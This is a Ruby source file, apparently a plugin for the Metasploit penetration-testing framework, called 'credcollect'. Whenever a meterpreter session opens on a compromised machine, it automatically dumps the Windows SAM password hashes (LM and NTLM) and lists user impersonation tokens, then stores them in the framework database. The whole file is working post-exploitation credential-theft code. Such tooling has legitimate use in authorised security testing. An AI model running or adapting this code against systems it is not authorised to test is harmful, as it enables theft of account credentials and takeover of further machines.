#
# $Id$
#
# credcollect - tebo[at]attackresearch.com
#
# $Revision$
#

module Msf

class Plugin::CredCollect < Msf::Plugin
  include Msf::SessionEvent

  class CredCollectCommandDispatcher
    include Msf::Ui::Console::CommandDispatcher

    def name
      "credcollect"
    end

    def commands
      {
        "db_hashes" => "Dumps hashes (deprecated: use 'creds -s smb')",
        "db_tokens" => "Dumps tokens (deprecated: use 'notes -t smb_token')"
      }
    end

    def cmd_db_hashes()
      print_error ""
      print_error "db_hashes is deprecated. Use 'creds -s smb' instead."
      print_error ""
    end

    def cmd_db_tokens()
      print_error ""
      print_error "db_tokens is deprecated. Use 'notes -t smb_token' instead."
      print_error ""
    end

  end

  def on_session_open(session)

    return if not self.framework.db.active

    print_status("This is CredCollect, I have the conn!")

    if (session.type == "meterpreter")

      # Make sure we're rockin Priv and Incognito
      session.core.use("priv")
      session.core.use("incognito")

      # It wasn't me mom! Stinko did it!
      hashes = session.priv.sam_hashes

      # Target infos for the db record
      addr = session.sock.peerhost
      # This ought to read from the exploit's datastore.
      # Use the meterpreter script if you need to control it.
      smb_port = 445

      # Record hashes to the running db instance
      hashes.each do |hash|
        data = {}
        data[:host]  = addr
        data[:port]  = smb_port
        data[:sname] = 'smb'
        data[:user]  = hash.user_name
        data[:pass]  = hash.lanman + ":" + hash.ntlm
        data[:type]  = "smb_hash"
        data[:active] = true

        self.framework.db.report_auth_info(data)
      end

      # Record user tokens
      tokens = session.incognito.incognito_list_tokens(0).values
      # Meh, tokens come to us as a formatted string
      tokens = tokens.join.strip!.split("\n")

      tokens.each do |token|
        data = {}
        data[:host]      = addr
        data[:type]      = 'smb_token'
        data[:data]      = token
        data[:update]    = :unique_data

        self.framework.db.report_note(data)
      end
    end
  end

  def on_session_close(session,reason='')
  end

  def initialize(framework, opts)
    super
    self.framework.events.add_session_subscriber(self)
    add_console_dispatcher(CredCollectCommandDispatcher)
  end

  def cleanup
    self.framework.events.remove_session_subscriber(self)
    remove_console_dispatcher('credcollect')
  end

  def name
    "db_credcollect"
  end

  def desc
    "Automatically grabs hashes and tokens from meterpreter session events and stores them in the db"
  end

end
end

